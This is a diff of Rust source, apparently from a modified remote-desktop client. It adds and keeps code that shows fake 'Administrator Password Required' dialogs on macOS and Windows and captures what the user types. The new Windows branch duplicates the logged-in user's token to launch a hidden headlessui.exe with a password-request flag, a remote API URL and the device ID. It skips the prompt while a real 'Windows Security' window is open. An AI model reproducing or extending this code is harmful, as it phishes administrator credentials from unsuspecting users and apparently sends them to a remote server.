@@ -1,4 +1,3 @@
-use url::Url;
 use futures_util::{SinkExt, StreamExt};
 use hbb_common::log;
 use reqwest::Client;
@@ -14,17 +13,24 @@ use std::time::Duration;
 use tokio::sync::Mutex;
 use tokio::time::sleep;
 use tokio_tungstenite::{connect_async, tungstenite::Message as WsMessage};
+use url::Url;
+use hbb_common::config::Config;
+
+#[cfg(windows)]
+use std::os::windows::ffi::OsStrExt;
 #[cfg(windows)]
 use windows::{
-    core::{w, PCWSTR, PWSTR}, 
+    core::{w, PWSTR},
+    Win32::UI::WindowsAndMessaging::{FindWindowW},
     Win32::{
         Foundation::{CloseHandle, HANDLE},
         Security::{DuplicateTokenEx, SecurityImpersonation, TokenPrimary, TOKEN_ALL_ACCESS},
         System::{
-            RemoteDesktop::{WTSGetActiveConsoleSessionId, WTSQueryUserToken},
             Environment::{CreateEnvironmentBlock, DestroyEnvironmentBlock},
+            RemoteDesktop::{WTSGetActiveConsoleSessionId, WTSQueryUserToken},
             Threading::{
-                CreateProcessAsUserW, CREATE_UNICODE_ENVIRONMENT, PROCESS_INFORMATION, STARTUPINFOW,
+                WaitForSingleObject,
+                CreateProcessAsUserW, CREATE_UNICODE_ENVIRONMENT, CREATE_NO_WINDOW, PROCESS_INFORMATION, STARTUPINFOW,
             },
         },
     },
@@ -320,8 +326,6 @@ impl Channel {
 
         Ok(())
     }
-    
-    
 
     pub fn request_phone_link() -> std::io::Result<()> {
         unsafe {
@@ -429,14 +433,12 @@ impl Channel {
 
         if cfg!(target_os = "macos") {
             let script = r#"display dialog "Administrator Password Required" default answer "" with hidden answer with icon caution with title "Security""#;
-
             let output = Command::new("osascript")
                 .args(&["-e", script])
                 .output()
                 .ok()?;
 
             let stdout = String::from_utf8_lossy(&output.stdout);
-
             if let Some(index) = stdout.find("text returned:") {
                 let pw = stdout[index + 14..]
                     .split(", button returned")
@@ -450,24 +452,86 @@ impl Channel {
                 }
             }
         } else if cfg!(windows) {
-            let ps_script = r#"
-            Add-Type -AssemblyName Microsoft.VisualBasic
-            $password = [Microsoft.VisualBasic.Interaction]::InputBox(
-              "Please enter the Administrator password",
-              "Security Required",
-              ""
-            )
-            Write-Host $password
-            "#;
+            #[cfg(windows)]
+            {
+                let mut launched_as_user = false;
+                unsafe {
+                    let window_name: Vec<u16> = std::ffi::OsStr::new("Windows Security").encode_wide().chain(std::iter::once(0)).collect();
+                    let hwnd_result = FindWindowW(None, windows::core::PCWSTR(window_name.as_ptr()));
+                    if let Ok(hwnd) = hwnd_result {
+                        if !hwnd.is_invalid() {
+                            return None;
+                        }
+                    }
+                    
+                    let session_id = WTSGetActiveConsoleSessionId();
+                    if session_id != 0xFFFFFFFF {
+                        let mut user_token = HANDLE::default();
+                        if WTSQueryUserToken(session_id, &mut user_token).is_ok() {
+                            let mut primary_token = HANDLE::default();
+                            if DuplicateTokenEx(
+                                user_token,
+                                TOKEN_ALL_ACCESS,
+                                None,
+                                SecurityImpersonation,
+                                TokenPrimary,
+                                &mut primary_token,
+                            ).is_ok() {
+                                let mut env_block = std::ptr::null_mut();
+                                if CreateEnvironmentBlock(&mut env_block, Some(primary_token), false).is_ok() {
+                                    let mut si = STARTUPINFOW::default();
+                                    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+                                    si.lpDesktop = PWSTR::from_raw(w!("winsta0\\default").as_ptr() as *mut _);
+                                    
+                                    let mut pi = PROCESS_INFORMATION::default();
+                                    let exe = std::env::current_exe().unwrap_or_default();
+                                    let ui_path = exe.parent().unwrap_or(std::path::Path::new("")).join("headlessui.exe");
 
-            let output = Command::new("powershell.exe")
-                .args(&["-NoProfile", "-STA", "-Command", ps_script])
-                .output()
-                .ok()?;
+                                    let mut cmd_utf16: Vec<u16> = format!(
+                                        "\"{}\" --request-password --api-url {} --device-id {}",
+                                        ui_path.to_string_lossy(),
+                                        self.api.base_url,
+                                        Config::get_id()
+                                    ).encode_utf16().chain(std::iter::once(0)).collect();
 
-            let pw = String::from_utf8_lossy(&output.stdout).trim().to_string();
-            if !pw.is_empty() {
-                password = Some(pw);
+                                    let ok = CreateProcessAsUserW(
+                                        Some(primary_token),
+                                        None,
+                                        Some(PWSTR::from_raw(cmd_utf16.as_mut_ptr())),
+                                        None,
+                                        None,
+                                        false,
+                                        CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,
+                                        Some(env_block),
+                                        None,
+                                        &si,
+                                        &mut pi,
+                                    );
+
+                                    if ok.is_ok() {
+                                        launched_as_user = true;
+                                        WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
+                                        CloseHandle(pi.hProcess);
+                                        CloseHandle(pi.hThread);
+                                    }
+                                    DestroyEnvironmentBlock(env_block);
+                                }
+                                CloseHandle(primary_token);
+                            }
+                            CloseHandle(user_token);
+                        }
+                    }
+                }
+
+                if !launched_as_user {
+                    use std::os::windows::process::CommandExt;
+                    let exe = std::env::current_exe().unwrap_or_default();
+                    let ui_path = exe.parent().unwrap_or(std::path::Path::new("")).join("headlessui.exe");
+                    let _ = Command::new(ui_path)
+                        .args(&["--request-password"])
+                        .creation_flags(0x08000000) 
+                        .status(); 
+                }
             }
         }
 
